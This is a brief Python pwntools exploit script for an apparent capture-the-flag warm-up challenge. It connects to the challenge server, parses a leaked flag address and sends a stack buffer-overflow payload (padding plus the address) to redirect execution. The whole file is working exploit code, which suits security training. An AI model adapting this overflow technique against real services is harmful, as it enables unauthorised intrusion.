from pwn import *

r = remote("pwn-warmup.chal.uiuc.tf", 1337)

r.recvuntil("flag = ")
flag_addr = int(r.recvuntil("\n", drop =True).decode(),16)
padding = b"A"*16

payload = padding + p32(0) + p32(flag_addr)

r.sendline(payload)
r.interactive()
